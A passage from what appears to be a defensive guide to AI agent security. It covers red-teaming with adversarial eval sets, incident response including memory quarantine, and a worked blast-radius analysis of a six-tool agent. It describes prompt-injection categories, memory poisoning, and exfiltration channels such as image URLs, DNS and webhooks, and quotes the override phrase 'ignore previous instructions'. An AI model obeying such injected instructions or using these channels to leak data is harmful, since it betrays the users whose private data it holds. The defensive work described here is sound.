This closes the loop with Section 7's core argument directly: the single most reliable heuristic for deciding which actions deserve a permission prompt at all is not "does this tool sound dangerous" (a judgment call that varies by person and context) but a mechanically checkable property — **can this action's effect be undone**. A file write to a path that's already version-controlled is reversible (revert the commit); a `DROP TABLE` with no backup, a sent email, a pushed commit that's already been pulled by someone else, or a webhook call that already fired at an external system are not — the receiving party cannot be un-notified, the database rows cannot be un-dropped. Gating human approval specifically on irreversibility, rather than on a subjective "this seems risky" judgment, gives Section 7's rare-and-therefore-meaningful permission prompt a principled, consistent, and auditable trigger condition instead of an ad hoc one that will inevitably drift and grow inconsistent as the tool set grows.

## Key Takeaways for Section 10

Four guardrails, each a runtime backstop for a specific way preventive controls can fail: secret scanning catches sensitive data about to leave the trusted boundary regardless of how it got into the output; destructive-command detection is an independent second check against exactly the actions a permission-system bug could let slip through; rate and blast-radius limits cap damage by frequency and by scope respectively, assuming an attack has already partially succeeded; and irreversibility, checked mechanically rather than judged subjectively, is the correct, principled trigger condition for which actions get Section 7's rare, meaningful human-approval gate.

---

# 11: Red-Teaming Your Own Agent

## Starting From Plain Language

Every control in this chapter is a hypothesis about what will keep the agent safe. Red-teaming is how you test that hypothesis deliberately, before an attacker tests it for you — building a genuine adversarial eval set of injection attempts and other attack patterns, and running the agent against it the same disciplined way Chapter 14 runs a functional eval suite, because a security control that has never been attacked in a controlled setting is a control whose actual effectiveness is simply unknown.

## Building the Adversarial Eval Set

The set should span Section 4's full taxonomy, not just direct injection — indirect injection embedded in web content, documents, and issue-comment-style text; multi-stage attempts that require the agent to fetch a second attacker-controlled resource; and persistent-injection attempts targeting memory writes or skill invocation specifically. It should also span Section 2's trifecta directly: cases that test whether the reader/doer split (Section 3) actually holds under pressure, cases that test whether an egress allowlist (Section 6) actually blocks Section 5's less obvious exfiltration channels, and cases that test whether guardrails (Section 10) actually fire on genuinely destructive or secret-leaking outputs rather than only on the specific example scenario they were originally written against. This chapter's own code deliverable asks for exactly 15 such cases as a starting adversarial set — a number chosen to be large enough to span the taxonomy meaningfully while still being small enough to build, review, and maintain by hand, the same "start real and small, grow it" discipline Chapter 14 Section 3 applied to golden datasets.

## Gating Releases on It, in CI

The README is explicit that this belongs in Chapter 14's CI-integrated regression harness, not as a separate, occasionally-run security exercise — every harness change (a new tool, a modified prompt, a new skill or MCP server integration) should be checked against the adversarial set exactly the way Chapter 14 Section 8 gates a merge on the functional regression suite, with the same statistical discipline (Chapter 14 Section 7's SE/MDD reasoning applies here too — a security regression that only shows up 1 time in 20 adversarial runs due to model stochasticity needs enough repeated runs to distinguish from noise, exactly like a functional regression does). This is a meaningfully different failure mode to gate on than Chapter 14's functional regressions: a "regression" here means a previously-blocked attack that now succeeds, and per NIST's Center for AI Standards and Innovation's own February 2026 open-sourced evaluation tooling (AgentDojo-Inspect, built specifically for measuring agent-hijacking success rates), the gap between defended and undefended baselines can be dramatic and worth knowing precisely — their published comparison found an 81% task-hijack success rate against a weak baseline versus 11% against a hardened one, an order-of-magnitude difference that a CI-gated adversarial suite is exactly the tool for catching if a harness change ever regresses toward the weak end of that range.

## Key Takeaways for Section 11

Build an adversarial eval set spanning Section 4's full injection taxonomy and Section 2's trifecta directly (not just the easiest-to-imagine direct-injection case), and wire it into Chapter 14's CI regression harness rather than treating security testing as a separate, occasional activity — a harness change that regresses your defenses should fail the same build a harness change that regresses functional correctness would fail. Published 2026 tooling shows the gap between a defended and undefended agent's hijack-success rate can be an order of magnitude (81% vs. 11% in one published comparison), which is precisely the kind of regression that goes undetected without a standing, CI-gated adversarial suite.

---

# 12: Incident Response

## Starting From Plain Language

Every control up to this point is preventive or detective. This final section assumes, explicitly and without embarrassment, that all of them will eventually fail at least once — because per Section 1, they will — and asks: what do you actually do in the minutes and days after you learn an agent was successfully attacked?

## Kill Switches

A kill switch is a mechanism that can immediately halt an agent's ability to take further action — pausing or revoking its tool access, its API credentials, or its execution entirely — reachable fast enough to matter and independent enough of the agent's own normal operation that a compromised agent cannot itself interfere with its own shutdown. This needs to exist and be tested *before* an incident, not designed for the first time during one; the worst possible moment to discover your kill switch depends on a system that's also compromised, or requires a multi-step manual process under pressure, is during a live incident.

## Credential Rotation

Following Section 6's short-lived-credential discipline, any credential that was accessible to a compromised execution path must be treated as burned the moment compromise is suspected, not merely after compromise is confirmed — rotate it immediately, and audit everything that credential could have touched during the suspected exposure window. This is meaningfully easier and lower-stakes precisely because Section 6 already recommended short-lived, narrowly-scoped credentials over long-lived broad ones — rotating a credential that was scoped to one task and already near its natural expiry is a much smaller operation than rotating a long-lived god-mode key that a dozen other systems also depend on.

## Audit Trails

Chapter 15's full observability discipline — every span, every tool call, every verifier outcome, captured with enough context to reconstruct exactly what happened — is what makes incident response possible at all rather than a guessing exercise; an incident response process that discovers, mid-investigation, that the relevant traces were never captured (Chapter 15 Section 4's checklist skipped, or Section 5's retention window already expired) has no way to establish scope, timeline, or root cause, and the honest answer to "what did the attacker actually access" becomes "we don't know," which is a categorically worse position than a slower but complete investigation.

## Memory Quarantine After a Suspected Poisoning

Following directly from Section 4's persistent-injection category: if there is any suspicion that Chapter 9's long-term memory was poisoned — a false fact, a corrupted preference, a planted instruction written during a compromised session — the memory store (or at minimum, the specific entries traceable to the suspect session) needs to be quarantined: frozen from further retrieval until reviewed, not merely flagged for eventual cleanup, because every retrieval of a poisoned memory entry between the moment of suspicion and the moment of cleanup is another opportunity for the original injection to re-trigger in a completely new session, potentially affecting a different user who had nothing to do with the original incident. This is the sharpest illustration in the whole chapter of why Section 4 called persistent injection the hardest variant to defend against: the same attack, injected once, can keep causing new incidents indefinitely unless the specific memory-quarantine step is taken deliberately, since normal session-scoped remediation (fixing the current conversation) does nothing to the memory store the attack actually targeted.

## Key Takeaways for Section 12

Kill switches, credential rotation, audit trails, and memory quarantine are the four pillars of responding to an incident you've already accepted, per Section 1, will eventually happen: a kill switch needs to be built and tested before it's needed, not during; credential rotation is cheap specifically because Section 6 already recommended short-lived scoped credentials over long-lived ones; audit trails require Chapter 15's full observability discipline to have already been in place, since you cannot reconstruct what you never captured; and memory quarantine is the one incident-response step specific to persistent injection, without which a single successful poisoning keeps re-triggering across unrelated future sessions indefinitely.

---

# 13: Dry-Run — Blast-Radius Analysis, Before and After Least Privilege

## The Agent and Its Tools

Take a concrete, realistic research-and-notification assistant with 6 tools, and classify each one along the three trifecta legs from Section 2 — which capabilities does *holding this tool* grant, independent of any other tool:

| Tool | Private data access? | Untrusted content exposure? | Exfiltration vector? | Legs held |
|---|---|---|---|---|
| `read_local_files` | Yes | No | No | {private} |
| `read_inbox` | Yes | **Yes** (emails can be attacker-authored) | No | {private, untrusted} |
| `web_fetch(url)` | No | Yes | No | {untrusted} |
| `send_email` | No | No | Yes | {network} |
| `post_webhook(url, payload)` | No | No | Yes | {network} |
| `write_local_file` | No | No | No | {} |

Note `read_inbox` alone already carries **two of the three legs** — reading an inbox is simultaneously private-data access (it's the user's own mail) and untrusted-content exposure (anyone can send an email), which is exactly why an inbox-reading agent is one of the most trifecta-prone designs in practice, and exactly the shape of three of the four real January 2026 incidents named in Section 2.

## Step 1: Every Pair, Before Any Fix

With all 6 tools available to a single, undivided agent, there are $\binom{6}{2} = 15$ possible tool pairs. A pair is **exploitable** if the union of the two tools' legs covers all three trifecta legs — the model doesn't need all three legs from a *single* tool; two tools, used together in one execution path, are just as dangerous if their combined capabilities close the triangle:

| Pair | Combined legs | Covers all 3? |
|---|---|---|
| read_local_files + read_inbox | {private, untrusted} | No |
| read_local_files + web_fetch | {private, untrusted} | No |
| read_local_files + send_email | {private, network} | No |
| read_local_files + post_webhook | {private, network} | No |
| read_local_files + write_local_file | {private} | No |
| read_inbox + web_fetch | {private, untrusted} | No |
| **read_inbox + send_email** | **{private, untrusted, network}** | **YES** |
| **read_inbox + post_webhook** | **{private, untrusted, network}** | **YES** |
| read_inbox + write_local_file | {private, untrusted} | No |
| web_fetch + send_email | {untrusted, network} | No |
| web_fetch + post_webhook | {untrusted, network} | No |
| web_fetch + write_local_file | {untrusted} | No |
| send_email + post_webhook | {network} | No |
| send_email + write_local_file | {network} | No |
| post_webhook + write_local_file | {network} | No |

$$\text{Exploitable pairs before any fix} = 2 \text{ out of } 15$$

Both exploitable pairs involve `read_inbox` specifically, and each needs only *one* additional tool (either exfiltration tool) to close the triangle — a direct, numeric confirmation of Section 2's point that a single tool covering two legs is disproportionately dangerous compared to a tool covering only one.

## Step 2: Applying the Reader/Doer Split (Section 3) Plus Least Privilege (Section 6)

Restructure the same 6 tools across three separated execution paths, with no tool ever crossing a boundary once assigned:

**Orchestrator** (fetches raw untrusted content, but never acts on it and never holds a network-out tool): `read_inbox`, `web_fetch` — combined legs = {private, untrusted}. **Reader** (zero tools, pure analysis of whatever the orchestrator hands it, returns structured output only): no tools at all — combined legs = {}. **Doer** (acts on the reader's sanitized structured output only, never sees raw untrusted content): `send_email`, `post_webhook`, `read_local_files`, `write_local_file` — combined legs = {private, network} (private here because `read_local_files` is scoped separately from the inbox/web content and the doer never mixes it with untrusted input).

## Step 3: Every Pair, After the Fix

A "pair" is only meaningful within a single execution path now, since no two tools from different paths are ever available to the same LLM call. Checking each path's own internal pairs against the same all-3-legs criterion:

**Orchestrator's only possible pair** (`read_inbox` + `web_fetch`): combined legs = {private, untrusted} — missing `network` entirely, because the orchestrator was never given a network-out tool. **Not exploitable, and structurally cannot become exploitable** no matter what content it reads, since the capability simply doesn't exist in this path.

**Reader's pairs**: none — zero tools means zero pairs, trivially safe.

**Doer's pairs** (from `{send_email, post_webhook, read_local_files, write_local_file}`, 6 possible pairs): the richest combination is `read_local_files` + `send_email` (or `post_webhook`) = {private, network} — missing `untrusted` entirely, because the doer never receives raw untrusted content, only the reader's already-sanitized, schema-validated structured output. **Not exploitable, and structurally cannot become exploitable**, since there is no execution path into the doer for untrusted content to arrive through at all.

$$\text{Exploitable pairs after the reader/doer split + least privilege} = 0 \text{ out of any pair, in any path}$$

## Step 4: Why Zero, Specifically, and Not Just "Fewer"

The result isn't a probabilistic reduction from 2 exploitable pairs down to some smaller number — it's a **structural** elimination, and the reason is visible directly in the two post-fix legs-sets above: the orchestrator's leg-set permanently excludes `network` (no network-out tool was ever granted to it), and the doer's leg-set permanently excludes `untrusted` (no untrusted-content path was ever wired into it). Every possible pair within each execution path inherits that path's own permanent gap — there is no combination of tools *within* either path that can manufacture the missing leg, because the missing leg isn't a matter of tool selection, it's a matter of what capability was never assigned to that path's boundary in the first place. This is Section 3's "architecturally irrelevant, not just less likely" claim, now demonstrated with an exhaustive, real enumeration rather than asserted in the abstract.

## Key Takeaways for Section 13

Blast-radius analysis is a mechanical, enumerable exercise: classify every tool by which trifecta legs it grants, enumerate every pair, and count how many pairs' combined legs cover all three. On this chapter's 6-tool example agent, that count is 2 out of 15 before any fix — both pairs traceable to `read_inbox`'s unusually leg-rich {private, untrusted} classification — and it drops to a demonstrable, structural **zero** after applying the reader/doer split with least-privilege tool assignment, not because any individual attack got harder, but because the specific combination of capabilities the trifecta requires no longer exists within any single execution path in the redesigned agent.

---

# 14: Key Takeaways and Master Decision Table

The core impossibility — a model cannot reliably tell trusted instructions from untrusted content embedded in what it reads, because the distinction is one of provenance, not content — is permanent, not a temporary gap current models will close; every other control in this chapter exists downstream of accepting that fact. The lethal trifecta (private data access, untrusted content exposure, an exfiltration vector, all in one execution path) is the precise, documented condition under which "the model got fooled" becomes "data actually left the building," proven out repeatedly in named January 2026 production incidents sharing an identical pattern. The reader/doer split breaks the trifecta architecturally — a tool-less reader and a content-blind doer — which Section 13's exhaustive enumeration showed collapses a real agent's exploitable-pair count from 2 to a structural zero, not merely a smaller number. Prompt injection spans four categories of increasing subtlety (direct, indirect, multi-stage, persistent), and a defense suite covering only the easiest-to-imagine direct case leaves the other three — the ones actually responsible for most real incidents — wide open. Exfiltration hides in channels that don't look like communication tools at all (image URLs, DNS lookups, error messages, git remotes, webhooks), and least privilege (per-tool scoping, read-only-by-default, path/network allowlists, short-lived scoped credentials) is this chapter's primary control specifically because it still bounds damage even when every detection- and architecture-based layer has already failed. Permission prompts only provide real protection when they're rare enough to be read — a prompt shown on every action trains reflexive approval and is worse than no prompt at all, which is why irreversibility, checked mechanically, is the right trigger for showing one. Sandboxing (containers vs. Firecracker microVMs, per E2B's and Modal's differing approaches) bounds capability independent of permission logic, but isolation from the host is not automatically isolation from the network or from resource exhaustion, and browser agents need their own state/network isolation considered explicitly. The agent supply chain — MCP servers, skills, subagent definitions — is a real, currently-exploited attack surface (over a third of scanned skills flawed, thousands of confirmed-malicious payloads found in a single February 2026 audit), defended the same way the software supply chain eventually was: pinning, review, and cryptographic signature verification. Guardrails (secret scanning, destructive-command detection, rate/blast-radius limits) are the runtime backstop for when prevention fails, and a CI-gated adversarial eval set spanning the full injection taxonomy is how you find out whether your defenses actually work before an attacker finds out for you. And incident response — kill switches, credential rotation, audit trails, memory quarantine — assumes, correctly, that all of the above will eventually fail at least once, with memory quarantine specifically closing the gap that persistent injection would otherwise leave open indefinitely.

| Situation | What to reach for | Why |
|---|---|---|
| Agent reads any content you didn't author yourself | Assume injection is possible; never rely on filters/keywords to catch it | Section 1: the model cannot separate instruction from content by provenance; no filter closes that gap reliably |
| Agent has private-data access AND touches untrusted content AND can communicate out | Reader/doer split (Section 3) before anything else | This is the exact lethal-trifecta shape; architectural separation, not better prompting, is what actually closes it |
| Deciding what taxonomy of attacks to defend against | Cover direct, indirect, multi-stage, AND persistent (Section 4) | Real incidents cluster in indirect/persistent, the categories naive filtering misses entirely |
| Reviewing tool capabilities for exfiltration risk | Check image URLs, DNS, error messages, git remotes, webhooks -- not just "send" tools | Section 5: these channels leak data without looking like a communication tool at all |
| Scoping any new tool | Read-only-by-default, path/network allowlist, short-lived credential | Section 6: bounds damage even when every other control has already failed |
| Deciding which actions need a human-approval prompt | Gate on irreversibility, checked mechanically | Section 7/10: a prompt shown on everything trains reflexive approval; rare + irreversible is the only trigger that stays meaningful |
| Running arbitrary or possibly-adversarial code | A real sandbox (microVM for strongest isolation, container if lower-risk) | Section 8: bounds capability independent of your own permission-logic bugs |
| Adding a new MCP server, skill, or subagent definition | Pin the version, review it like a code dependency, verify signatures where available | Section 9: over a third of scanned skills had a real flaw in a single Feb-2026 audit |
| Wanting to know if your defenses actually work | A CI-gated adversarial eval set spanning the full taxonomy (Section 11) | Untested defenses are a hypothesis, not a fact; published gaps between defended/undefended agents run 81% vs. 11% |
| An attack is suspected or confirmed | Kill switch first, then credential rotation, audit-trail reconstruction, and memory quarantine if persistence is possible | Section 12: each step depends on infrastructure (Ch15 tracing, Ch6 short-lived creds) built BEFORE the incident, not during it |

**Gotchas, collected.** Believing "ignore previous instructions"-style filters work (Section 1 — provenance, not content, is what separates trust, and no filter reconstructs provenance after the fact); auditing prompts instead of capabilities (a prompt review tells you what the model was *told* to do; only a capability review tells you what it was actually *able* to do if fooled); sandboxing code but not the network (isolation from the host filesystem/process space is not isolation from the internet — Section 8's network-policy-inside-the-sandbox point exactly); and forgetting that memory persists an injection across sessions (Section 4/12 — a defense that only inspects the current session's content misses a payload that already landed in long-term memory during a previous one, and keeps re-triggering until it's specifically quarantined).
